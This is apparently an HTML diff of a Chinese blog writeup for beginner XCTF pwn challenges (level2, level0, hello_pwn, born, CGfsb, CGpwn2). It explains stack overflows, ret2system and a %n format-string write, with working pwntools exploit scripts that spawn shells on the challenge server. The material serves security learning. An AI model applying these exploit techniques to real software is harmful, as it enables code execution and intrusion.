@@ -402,6 +402,22 @@
             
 
             
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2019-08-22 17:11:56" itemprop="dateModified" datetime="2019-08-22T17:11:56+08:00">2019-08-22</time>
+              
+            
           </span>
 
           
@@ -1549,11 +1565,16 @@ MathJax.Hub.Config({
 <p>题目比较简单</p>
 <p>只开了NX，函数也就一个，并且有read函数，存在溢出。<br>
 可以通过<br>
-<img alt="leve2-l2py" src="/2019/08/17/攻防世界-新手/2.GIF"><br>
-<img alt="leve2-l2py" src="/2019/08/17/攻防世界-新手/1.GIF"><br>
+<img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-2.GIF"><br>
+<img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-1.GIF"><br>
 在IDA中，找到字符串窗口，可以搜索到“/bin/sh”的地址。<br>
-leve2-bin<br>
-因为本身有system函数，也能找到sysytem函数的地址。这就为解题减轻难度。</p>
+<img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-bin.GIF"><br>
+因为本身有system函数，也能找到sysytem函数的地址。这就为解题减轻难度。<br>
+<img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-system.GIF"><br>
+还有就是填充的长度，可以通过IDA中的【ebp-88h】知道栈空间为88h再加上ebp的4（32位下），所以填充大小就是88h+4</p>
+<p>原理方面就是，想办法让他调用system(&ldquo;/bin/sh&rdquo;)<br>
+payload：  填充数据+p32（system_addr）+p32(sys的返回地址，实际上无所谓)+p32(/bin/sh作为sys的参数)<br>
+即：我们可以构造一个system(&ldquo;/bin/sh&rdquo;)的伪栈帧，vulnerable_function()执行结束后返回到我们构造的伪栈帧去执行system(&ldquo;bin/sh&rdquo;)，这样就可以获取shell。（需要注意一点，因为我们的目的是通过system(&ldquo;bin/sh&rdquo;)来获取shell，所以函数执行完后的返回地址可以任意。）</p>
 <h2 id="exp"><a name="user-content-exp" href="#exp" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>exp</h2>
 <h3 id="l2py"><a name="user-content-l2py" href="#l2py" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>l2.py</h3>
 <p><div class="codehilite"><pre><span class="o">!</span><span class="p">[</span><span class="n">leve2</span><span class="o">-</span><span class="n">level2py</span><span class="p">](</span><span class="nl">D</span><span class="p">:</span><span class="err">\</span><span class="n">blog</span><span class="err">\</span><span class="n">betterlh</span><span class="err">\</span><span class="n">source</span><span class="err">\</span><span class="n">_posts</span><span class="err">\攻防世界</span><span class="o">-</span><span class="err">新手\</span><span class="n">leve2</span><span class="o">-</span><span class="n">level2py</span><span class="p">.</span><span class="n">GIF</span><span class="p">)</span><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
@@ -1588,7 +1609,150 @@ leve2-bin<br>
 </pre></div>
 
 
-<p><img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-l2py.GIF"></p></article></body></html>
+<p><img alt="leve2-l2py" src="///D://blog/betterlh/source/_posts/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B/leve2-l2py.GIF"></p>
+<h2 id="binsh"><a name="user-content-binsh" href="#binsh" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>补充：无/bin/sh</h2>
+<p>补充一下，如果里面没有/bin/sh要自己写入的话</p>
+<p>利用read函数写入&rdquo;/bin/sh&rdquo;的重点是构造这个payload模块：</p>
+<p>padding1 + address of read + address of system + p32(0)+p32(addr_bss)+p32(10)</p>
+<p>其中，address of system为read函数调用完后的返回地址，p32(0)，p32(addr_bss)，p32(10)为传给read函数的三个参数，p32(addr_bss)将存入&rdquo;/bin/sh\x00&rdquo;。</p>
+<p>原文链接：<a href="https://blog.csdn.net/weixin_44319142/article/details/89107325" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44319142/article/details/89107325</a></p>
+<p>如果是64位的话就不一样了<br>
+同样可以利用IDA来查找system的地址以及/bin/sh的地址</p>
+<p><a href="https://www.jianshu.com/p/f3ebf8a360f0" target="_blank" rel="noopener">NX机制及绕过策略-ROP64位</a><br>
+<a href="https://www.jianshu.com/p/4d7dc3d0df86" target="_blank" rel="noopener">level2</a><br>
+<a href="https://blog.csdn.net/qq_44832048/article/details/97263868" target="_blank" rel="noopener">攻防世界level2 x_64位</a></p>
+<hr>
+<h1 id="level0"><a name="user-content-level0" href="#level0" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>level0</h1>
+<p><img alt="checksec" src="/2019/08/17/攻防世界-新手/level0-1.GIF"><br>
+只有NX，64位</p>
+<p>看代码，没啥东西，一个write一个read。存在system</p>
+<p>exp<br>
+<div class="codehilite"><pre><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">level0</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="cp"># p = remote(&quot;111.198.29.45&quot;,&quot;31008&quot;)</span>
+<span class="n">call_system</span> <span class="o">=</span> <span class="mh">0x400596</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x88</span><span class="o">*</span><span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_system</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</p>
+<hr>
+<h1 id="hello_pwn"><a name="user-content-hello_pwn" href="#hello_pwn" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>hello_pwn</h1>
+<p><img alt="checksec" src="/2019/08/17/攻防世界-新手/hello-1.GIF"><br>
+checksec<br>
+只有NX，可以尝试64位NX绕过</p>
+<p>看到代码里 有个if条件，估计是从这里入手<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/hello-2.GIF"><br>
+可以看到只要满足if条件，就可以获取到flag<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/hello-3.GIF"><br>
+可以看出，这个地址和上面read函数的参数连着的，只差4，所以填充4就好</p>
+<p>exp<br>
+<div class="codehilite"><pre><span class="cp">#! /usr/bin/env python</span>
+<span class="cp"># -*- coding:utf-8 -*-</span>
+<span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">debug</span><span class="err">&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">hello_pwn</span><span class="err">&#39;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span> <span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1853186401</span><span class="p">)</span> 
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&quot;111.198.29.45&quot;</span><span class="p">,</span><span class="mi">41431</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;bof&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+</p>
+<hr>
+<h1 id="born"><a name="user-content-born" href="#born" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>born</h1>
+<p>64位<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/born-1.GIF"></p>
+<p>这题看它的伪代码就可以知道要让v5这个值等于对应的数值就可以了。但是他在前面又不让你等于这个数，怎么办?<br>
+认真看可以发现他是先输入v5的值，再输入v4的值，那么一开始v5的值不等于1926就好了，然后用v4溢出覆盖v5（地址刚好连续，只差8），这个时候就可以满足条件了<br>
+通过IDA 可以发现这两个值的地址（var20和var18）<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/born-2.GIF"></p>
+<p>exp：<br>
+<div class="codehilite"><pre><span class="ch">#! /usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;debug&#39;</span>
+<span class="c1">#p = process(&quot;./born&quot;)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">&quot;111.198.29.45&quot;</span><span class="p">,</span><span class="mi">59781</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;Birth?&quot;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="mi">1999</span><span class="p">))</span>
+<span class="n">payload</span><span class="o">=</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1926</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;What&#39;s Your Name?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</p>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">&#39;111.198.29.45&#39;</span><span class="p">,</span><span class="mi">35721</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1926</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;Your Birth?&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1999&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+
+<h1 id="cgfsb"><a name="user-content-cgfsb" href="#cgfsb" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>CGfsb</h1>
+<p>这是一道格式字符串漏洞<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/CG-1.GIF"><br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/CG-T.GIF"><br>
+只要pwnme=8，就会cat flag<br>
+这里有个printf格式化字符串漏洞，利用这个可以将pwnme（地址直接用IDA就找到了）的值给覆盖成题目需要的值8<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/CG-2.GIF"><br>
+用gdb调试，发现它的位置在11（实际上是10因为第一个是我们的格式化字符串，这个是不会打印出来的）<br>
+payload：<br>
+pwnme 的地址占了4位数，然后我们在输入4个a就有8位了。<br>
+exp：<br>
+<div class="codehilite"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">&quot;debug&quot;</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./CGfsb&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">&quot;./CGfsb&quot;</span><span class="p">)</span>
+
+<span class="c1">#p=remote(&quot;111.198.29.45&quot;,34699)</span>
+<span class="n">pwnme</span><span class="o">=</span><span class="mh">0x0804a068</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;name:&quot;</span><span class="p">,</span><span class="s">&quot;aaaa&quot;</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;aaaa%10$n&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">&quot;please:&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/CG-3.GIF"></p>
+<h1 id="cgpwn2"><a name="user-content-cgpwn2" href="#cgpwn2" class="headeranchor-link" aria-hidden="true"><span class="headeranchor"></span></a>CGpwn2</h1>
+<p>这题好像是一个简单的溢出<br>
+有用的代码是这里<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/cgpwn2-1.GIF"><br>
+这里有个fget函数，以及存在漏洞的gets函数。<br>
+这里的name是全局变量，name 的地址0804A080<br>
+可以看到这题有system函数，但是没有/bin/sh，要想办法构造，这里可以直接写道全局变量name中，到时候system函数调用时，再用它的首地址作为参数就行了。<br>
+利用get的溢出，让eip为system的地址，这里可以使用pattern工具来找溢出点IDA上可以看到s是ebp-26h也可以知道是26h+4=42。<br>
+exp：<br>
+<div class="codehilite"><pre><span class="ch">#!usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">&#39;debug&#39;</span>
+<span class="c1">#io = remote(&quot;111.198.29.45&quot;,39409)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&quot;./cgpwn2&quot;</span><span class="p">)</span>
+
+
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">&quot;./cgpwn2&quot;</span><span class="p">)</span>  
+
+<span class="n">sys_addr</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">]</span>    
+<span class="c1">#sys_addr = 0x08048420</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;your name&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
+<span class="n">bin_sh_addr</span><span class="o">=</span><span class="mh">0x0804a080</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">42</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;leave some message here:&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<br>
+<img alt="checksec" src="/2019/08/17/攻防世界-新手/cgpwn2-2.GIF"></p></article></body></html>
           
         
       
@@ -1706,7 +1870,7 @@ leve2-bin<br>
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-21 23:24:57" itemprop="dateModified" datetime="2019-08-21T23:24:57+08:00">2019-08-21</time>
+                <time title="Updated at: 2019-08-23 22:10:16" itemprop="dateModified" datetime="2019-08-23T22:10:16+08:00">2019-08-23</time>
               
             
           </span>
@@ -1741,7 +1905,11 @@ leve2-bin<br>
       
         
           
-            <h1 id="level2-NX-ROP入门"><a href="#level2-NX-ROP入门" class="headerlink" title="level2 (NX-ROP入门)"></a>level2 (NX-ROP入门)</h1><p>参考：</p>
+            <p>参考的一系列文章：</p>
+<p><a href="https://blog.csdn.net/weixin_44319142/article/details/89077831" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44319142/article/details/89077831</a><br>感谢！<br>后面每题也根据不同的writeup写出来的</p>
+<h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><p>直接运行就可以了，看代码就发现会直接运行system函数，所以直接运行就ok<br><img src="/2019/08/17/攻防世界-新手/get_shell-1.GIF" alt="checksec"><br>直接拿到权限了，看来还是要写 exp，远程连接下<br>cyberpeace{057e59b4709123764babf99e2f5422c5}</p>
+<p>–·</p>
+<h1 id="level2-NX-ROP入门"><a href="#level2-NX-ROP入门" class="headerlink" title="level2 (NX-ROP入门)"></a>level2 (NX-ROP入门)</h1><p>参考：</p>
 <p><a href="https://bbs.pediy.com/thread-251334.htm" target="_blank" rel="noopener">[原创]XCTF攻防世界 level2</a><br><a href="https://blog.csdn.net/weixin_44319142/article/details/89107325" target="_blank" rel="noopener">攻防世界——pwn（2）</a><br><a href="https://www.jianshu.com/p/4d7dc3d0df86" target="_blank" rel="noopener">level2</a></p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>题目比较简单</p>
 <p>只开了NX，函数也就一个，并且有read函数，存在溢出。<br>可以通过<br><img src="/2019/08/17/攻防世界-新手/leve2-2.GIF" alt="leve2-l2py"><br><img src="/2019/08/17/攻防世界-新手/leve2-1.GIF" alt="leve2-l2py"><br>在IDA中，找到字符串窗口，可以搜索到“/bin/sh”的地址。<br><img src="/2019/08/17/攻防世界-新手/leve2-bin.GIF" alt="leve2-l2py"><br>因为本身有system函数，也能找到sysytem函数的地址。这就为解题减轻难度。<br><img src="/2019/08/17/攻防世界-新手/leve2-system.GIF" alt="leve2-l2py"><br>还有就是填充的长度，可以通过IDA中的【ebp-88h】知道栈空间为88h再加上ebp的4（32位下），所以填充大小就是88h+4</p>
@@ -1766,16 +1934,38 @@ leve2-bin<br>
 <p>看到代码里 有个if条件，估计是从这里入手<br><img src="/2019/08/17/攻防世界-新手/hello-2.GIF" alt="checksec"><br>可以看到只要满足if条件，就可以获取到flag<br><img src="/2019/08/17/攻防世界-新手/hello-3.GIF" alt="checksec"><br>可以看出，这个地址和上面read函数的参数连着的，只差4，所以填充4就好</p>
 <p>exp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"> </span><br><span class="line">elf = ELF('./hello_pwn')</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> *<span class="number">4</span> + p32(<span class="number">1853186401</span>) </span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">"111.198.29.45"</span>,<span class="number">41431</span>)</span><br><span class="line">io.sendlineafter(<span class="string">"bof"</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></p>
 <hr>
-<h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><p>直接运行就可以了，看代码就发现会直接运行system函数，所以直接运行就ok<br><img src="/2019/08/17/攻防世界-新手/get_shell-1.GIF" alt="checksec"><br>直接拿到权限了，看来还是要写 exp，远程连接下</p>
-<p>–·</p>
 <h1 id="born"><a href="#born" class="headerlink" title="born"></a>born</h1><p>64位<br><img src="/2019/08/17/攻防世界-新手/born-1.GIF" alt="checksec"></p>
 <p>这题看它的伪代码就可以知道要让v5这个值等于对应的数值就可以了。但是他在前面又不让你等于这个数，怎么办?<br>认真看可以发现他是先输入v5的值，再输入v4的值，那么一开始v5的值不等于1926就好了，然后用v4溢出覆盖v5（地址刚好连续，只差8），这个时候就可以满足条件了<br>通过IDA 可以发现这两个值的地址（var20和var18）<br><img src="/2019/08/17/攻防世界-新手/born-2.GIF" alt="checksec"></p>
 <p>exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process("./born")</span></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">59781</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Birth?"</span>,str(<span class="number">1999</span>))</span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">8</span>+p32(<span class="number">1926</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"What's Your Name?\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">35721</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">1926</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Your Birth?'</span>)</span><br><span class="line">p.sendline(<span class="string">'1999'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>这是一道格式字符串漏洞<br><img src="/2019/08/17/攻防世界-新手/CG-1.GIF" alt="checksec"><br><img src="/2019/08/17/攻防世界-新手/CG-T.GIF" alt="checksec"><br>只要pwnme=8，就会cat flag<br>这里有个printf格式化字符串漏洞，利用这个可以将pwnme（地址直接用IDA就找到了）的值给覆盖成题目需要的值8<br><img src="/2019/08/17/攻防世界-新手/CG-2.GIF" alt="checksec"><br>用gdb调试，发现它的位置在11（实际上是10因为第一个是我们的格式化字符串，这个是不会打印出来的）<br>payload：<br>pwnme 的地址占了4位数，然后我们在输入4个a就有8位了。<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">"./CGfsb"</span>)</span><br><span class="line">p=process(<span class="string">"./CGfsb"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote("111.198.29.45",34699)</span></span><br><span class="line">pwnme=<span class="number">0x0804a068</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(pwnme)+<span class="string">'aaaa%10$n'</span></span><br><span class="line">p.sendlineafter(<span class="string">"please:"</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>这是一道格式字符串漏洞<br><img src="/2019/08/17/攻防世界-新手/CG-1.GIF" alt="checksec"><br><img src="/2019/08/17/攻防世界-新手/CG-T.GIF" alt="checksec"><br>只要pwnme=8，就会cat flag<br>这里有个printf格式化字符串漏洞，利用这个可以将pwnme（地址直接用IDA就找到了）的值给覆盖成题目需要的值8<br><img src="/2019/08/17/攻防世界-新手/CG-2.GIF" alt="checksec"><br>用gdb调试，发现它的位置在11（实际上是10因为第一个是我们的格式化字符串，这个是不会打印出来的）<br>payload：<br>pwnme 的地址占了4位数，然后我们在输入4个a就有8位了。<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf=ELF(<span class="string">"./CGfsb"</span>)</span><br><span class="line"><span class="comment">#p=process("./CGfsb")</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">54477</span>)</span><br><span class="line">pwnme=<span class="number">0x0804a068</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"name:"</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(pwnme)+<span class="string">'aaaa%10$n'</span></span><br><span class="line">p.sendlineafter(<span class="string">"please:"</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/08/17/攻防世界-新手/CG-3.GIF" alt="checksec"></p>
-<h2 id="CGpwn2"><a href="#CGpwn2" class="headerlink" title="CGpwn2"></a>CGpwn2</h2><p>这题好像是一个简单的溢出<br>有用的代码是这里<br><img src="/2019/08/17/攻防世界-新手/cgpwn2-1.GIF" alt="checksec"><br>这里有个fget函数，以及存在漏洞的gets函数。<br>这里的name是全局变量，name 的地址0804A080<br>可以看到这题有system函数，但是没有/bin/sh，要想办法构造，这里可以直接写道全局变量name中，到时候system函数调用时，再用它的首地址作为参数就行了。<br>利用get的溢出，让eip为system的地址，这里可以使用pattern工具来找溢出点IDA上可以看到s是ebp-26h也可以知道是26h+4=42。<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#io = remote("111.198.29.45",39409)</span></span><br><span class="line">io = process(<span class="string">"./cgpwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"./cgpwn2"</span>)  </span><br><span class="line"></span><br><span class="line">sys_addr=elf.symbols[<span class="string">'system'</span>]    </span><br><span class="line"><span class="comment">#sys_addr = 0x08048420</span></span><br><span class="line">io.recvuntil(<span class="string">"your name"</span>)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">bin_sh_addr=<span class="number">0x0804a080</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">42</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">io.recvuntil(<span class="string">"leave some message here:"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
